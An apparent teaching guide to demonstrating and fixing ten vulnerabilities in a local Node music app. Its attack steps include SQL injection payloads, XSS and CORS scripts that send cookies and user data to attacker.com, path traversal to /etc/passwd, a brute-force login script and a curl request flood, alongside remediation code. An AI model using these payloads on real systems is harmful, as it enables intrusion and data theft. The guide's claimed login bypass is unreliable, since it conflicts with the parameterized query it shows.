**1. SQL Injection ⚠⚠⚠ (CRITICAL)**

Location: Sign In page, Music endpoints

Vulnerability: User input directly used in SQL queries without proper sanitization.

How to Demonstrate:

Attack 1: Bypass Login



Go to http://localhost:3000/signin.html

In email field, enter: admin@example.com' OR '1'='1

In password field, enter anything

This bypasses authentication



**Attack 2: Extract Database Info**



In email field: admin@example.com' UNION SELECT table\_name, NULL, NULL FROM information\_schema.tables WHERE table\_schema='CineCast'--

This reveals all table names



Why it Works:

javascript// Current vulnerable code in server.js:

const query = 'SELECT \* FROM users WHERE email = ?';

db.query(query, \[email], ...);

The ? placeholder helps, but other endpoints might be vulnerable.

Fix:

✅ Use parameterized queries (already doing this for most queries)

✅ Validate and sanitize all inputs

✅ Use ORM like Sequelize



**2. Weak Password Hashing ⚠⚠ (HIGH)**

Vulnerability: Using SHA-256 instead of bcrypt

Why it's Vulnerable:



SHA-256 is fast = easy to brute force

No salt = rainbow table attacks possible

Not designed for password hashing



How to Demonstrate:

Attack: Rainbow Table Attack



Get password hash from database:



sqlSELECT email, password FROM users;



Copy hash: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

Search on rainbow table sites like:



https://crackstation.net/

https://md5decrypt.net/Sha256/





Common passwords will be cracked instantly



Proof of Concept:

javascript// Your current code:

function hashPassword(password) {

&nbsp;   return crypto.createHash('sha256').update(password).digest('hex');

}



// Password: "password123"

// SHA-256: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

// Easily crackable!

Fix:

javascriptconst bcrypt = require('bcrypt');



// Hash password

const hashedPassword = await bcrypt.hash(password, 10);



// Verify password

const isValid = await bcrypt.compare(password, hashedPassword);



3\. No Input Validation ⚠⚠ (HIGH)

Vulnerability: Missing validation on file uploads, form inputs

How to Demonstrate:

Attack 1: Malicious File Upload



Rename a PHP shell script to malicious.mp3

Upload it as "music"

File gets stored on server

Could execute if server misconfigured



Attack 2: Oversized File Upload



Try uploading a 500MB file

Server might crash or run out of disk space

Denial of Service (DoS)



**Attack 3: XSS in Song Title**



Upload song with title: <script>alert('XSS')</script>

When displayed, JavaScript executes

Could steal session data



Fix:

javascript// Add file size validation

if (req.file.size > 10 \* 1024 \* 1024) { // 10MB limit

&nbsp;   return res.status(400).json({ message: 'File too large' });

}



// Sanitize inputs

const title = sanitizeHtml(req.body.title);



// Validate file MIME type

const validTypes = \['audio/mpeg', 'audio/wav', 'audio/flac'];

if (!validTypes.includes(req.file.mimetype)) {

&nbsp;   return res.status(400).json({ message: 'Invalid file type' });

}



**4. No Authentication/Authorization ⚠⚠ (HIGH)**

Vulnerability: Anyone can access any endpoint

How to Demonstrate:

Attack 1: Direct API Access

bash# Delete any song without login

curl -X DELETE http://localhost:3000/api/music/1



\# Get all users (admin endpoint)

curl http://localhost:3000/api/admin/users

Attack 2: Admin Endpoint Access



Don't log in at all

Directly visit: http://localhost:3000/admin.html

Access admin features without authentication



Fix:

javascript// Authentication middleware

function requireAuth(req, res, next) {

&nbsp;   const token = req.headers.authorization;

&nbsp;   if (!token) {

&nbsp;       return res.status(401).json({ message: 'Unauthorized' });

&nbsp;   }

&nbsp;   // Verify token

&nbsp;   next();

}



// Protected routes

app.delete('/api/music/:id', requireAuth, (req, res) => {

&nbsp;   // Only authenticated users can delete

});



5\. Cross-Site Scripting (XSS) ⚠⚠ (MEDIUM)

Vulnerability: User input displayed without sanitization

How to Demonstrate:

Attack: Stored XSS



Sign up with name: <img src=x onerror="alert('XSS')">

Upload song with title: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

When page loads, script executes

Could steal session cookies



Demonstration:

html<!-- Vulnerable display -->

<div class="song-title">${song.title}</div>



<!-- If title is: <script>alert('XSS')</script> -->

<!-- Script will execute! -->

Fix:

javascript// Sanitize output

function escapeHtml(text) {

&nbsp;   const map = {

&nbsp;       '\&': '\&amp;',

&nbsp;       '<': '\&lt;',

&nbsp;       '>': '\&gt;',

&nbsp;       '"': '\&quot;',

&nbsp;       "'": '\&#039;'

&nbsp;   };

&nbsp;   return text.replace(/\[\&<>"']/g, m => map\[m]);

}



// Use in HTML

<div class="song-title">${escapeHtml(song.title)}</div>



6\. Session Management Issues ⚠ (MEDIUM)

Vulnerability: Using sessionStorage (client-side)

How to Demonstrate:

Attack: Session Hijacking via XSS

javascript// If XSS vulnerability exists:

<script>

&nbsp;   // Steal user session

&nbsp;   const userId = sessionStorage.getItem('userId');

&nbsp;   const isAdmin = sessionStorage.getItem('isAdmin');

&nbsp;   

&nbsp;   // Send to attacker

&nbsp;   fetch('http://attacker.com/steal?id=' + userId + '\&admin=' + isAdmin);

</script>

Attack: Session Manipulation



Open browser console (F12)

Run:



javascriptsessionStorage.setItem('isAdmin', 'true');

sessionStorage.setItem('userId', '1');



Refresh page

Now you appear as admin (client-side only, but still dangerous)



Fix:



Use server-side sessions with express-session

Use JWT tokens with httpOnly cookies

Implement proper session timeout





7\. CORS Misconfiguration ⚠ (LOW-MEDIUM)

Vulnerability: app.use(cors()) allows all origins

How to Demonstrate:

Attack: Cross-Origin Data Theft



Create malicious HTML file:



html<script>

fetch('http://localhost:3000/api/admin/users')

&nbsp;   .then(r => r.json())

&nbsp;   .then(data => {

&nbsp;       // Send stolen data to attacker

&nbsp;       fetch('http://attacker.com/steal', {

&nbsp;           method: 'POST',

&nbsp;           body: JSON.stringify(data)

&nbsp;       });

&nbsp;   });

</script>



Open this file in browser

It can access your API from any domain



Fix:

javascriptconst cors = require('cors');

app.use(cors({

&nbsp;   origin: 'http://localhost:3000', // Only allow your domain

&nbsp;   credentials: true

}));



8\. Information Disclosure ⚠ (MEDIUM)

Vulnerability: Detailed error messages expose system info

How to Demonstrate:

Attack: Database Enumeration



Try invalid SQL operations

Error messages reveal:



Database type (MySQL)

Table names

Column names

File paths







Example Error:

Database error: Error: Table 'cinecast.music' doesn't exist

Reveals: Database name, table structure

Fix:

javascript// Don't send detailed errors to client

if (err) {

&nbsp;   console.error('Database error:', err); // Log server-side only

&nbsp;   return res.status(500).json({ 

&nbsp;       success: false, 

&nbsp;       message: 'Internal server error' // Generic message

&nbsp;   });

}



9\. No Rate Limiting ⚠ (MEDIUM)

Vulnerability: Unlimited requests allowed

How to Demonstrate:

Attack: Brute Force Login

pythonimport requests



\# Try 1000 passwords

for i in range(1000):

&nbsp;   response = requests.post('http://localhost:3000/signin', 

&nbsp;       json={'email': 'admin@example.com', 'password': f'password{i}'})

&nbsp;   if response.json().get('success'):

&nbsp;       print(f'Password found: password{i}')

&nbsp;       break

Attack: DoS (Denial of Service)

bash# Send 10000 requests rapidly

for i in {1..10000}; do

&nbsp;   curl http://localhost:3000/api/music \&

done

Fix:

javascriptconst rateLimit = require('express-rate-limit');



const limiter = rateLimit({

&nbsp;   windowMs: 15 \* 60 \* 1000, // 15 minutes

&nbsp;   max: 100 // limit each IP to 100 requests per windowMs

});



app.use('/signin', limiter);



10\. Path Traversal ⚠ (HIGH)

Vulnerability: File paths not validated

How to Demonstrate:

Attack: Access Restricted Files

bash# Try to access files outside uploads folder

curl http://localhost:3000/uploads/../server.js

curl http://localhost:3000/uploads/../../etc/passwd

Fix:

javascriptconst sanitizedPath = path.normalize(req.params.file).replace(/^(\\.\\.(\\/|\\\\|$))+/, '');

const fullPath = path.join(\_\_dirname, 'uploads', sanitizedPath);



// Verify path is within uploads folder

if (!fullPath.startsWith(path.join(\_\_dirname, 'uploads'))) {

&nbsp;   return res.status(403).json({ message: 'Forbidden' });

}



🎭 Complete Attack Demonstration Scenario

Scenario: Complete System Compromise

Step 1: Reconnaissance

bash# Check what's running

curl http://localhost:3000

Step 2: SQL Injection (Bypass Login)



Email: ' OR '1'='1'--

Password: anything

Result: Logged in without valid credentials



Step 3: XSS (Steal Session)



Upload song with title: <script>alert(sessionStorage.getItem('userId'))</script>

Result: Execute JavaScript, steal session



Step 4: Session Manipulation

javascriptsessionStorage.setItem('isAdmin', 'true');



Result: Appear as admin



Step 5: Direct API Access

bashcurl -X DELETE http://localhost:3000/api/music/1



Result: Delete songs without authentication



Step 6: File Upload Exploit



Upload malicious file disguised as MP3

Result: Potentially execute code on server





🛡 Security Best Practices to Implement

Priority 1: Critical Fixes



Replace SHA-256 with bcrypt



bashnpm install bcrypt



Add Input Validation



bashnpm install express-validator



Implement Authentication Middleware



bashnpm install jsonwebtoken



Add Rate Limiting



bashnpm install express-rate-limit

Priority 2: Important Fixes



Sanitize HTML Output



bashnpm install sanitize-html



Add CSRF Protection



bashnpm install csurf



Use Environment Variables



bashnpm install dotenv



Add Security Headers



bashnpm install helmet



📊 Vulnerability Summary

VulnerabilitySeverityEase of ExploitImpactSQL InjectionCRITICALEasyFull DB AccessWeak HashingHIGHMediumPassword CompromiseNo AuthHIGHVery EasyUnauthorized AccessXSSMEDIUM-HIGHEasySession HijackingFile UploadMEDIUMMediumCode ExecutionRate LimitingMEDIUMEasyDoSSession IssuesMEDIUMEasyAccount TakeoverCORSLOW-MEDIUMMediumData TheftInfo DisclosureMEDIUMEasyRecon DataPath TraversalHIGHMediumFile Access



🎓 Demonstration Tips



Start with basics - Show SQL injection first

Use browser console - F12 to show XSS

Use curl/Postman - Demonstrate API vulnerabilities

Show database - Query database to show compromised data

Explain impact - After each attack, explain real-world consequences





⚠ Remember



This is for educational purposes only

Only test on your own localhost

Never use these techniques on production systems

Always get written permission before security testing

